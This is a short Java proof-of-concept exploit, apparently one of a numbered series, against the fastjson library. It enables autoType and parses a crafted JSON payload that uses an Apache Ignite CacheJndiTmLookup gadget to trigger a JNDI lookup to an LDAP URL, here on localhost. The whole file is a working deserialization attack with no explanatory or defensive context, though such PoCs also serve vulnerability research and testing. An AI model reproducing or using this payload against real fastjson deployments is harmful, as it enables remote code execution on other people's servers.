import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.xml.internal.ws.api.ha.StickyFeature;

public class EXP_1267 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\"," +
                " \"jndiNames\":[\"ldap://localhost:1234/ExportObject\"], \"tm\": {\"$ref\":\"$.tm\"}}";
        JSON.parse(poc);
    }
}
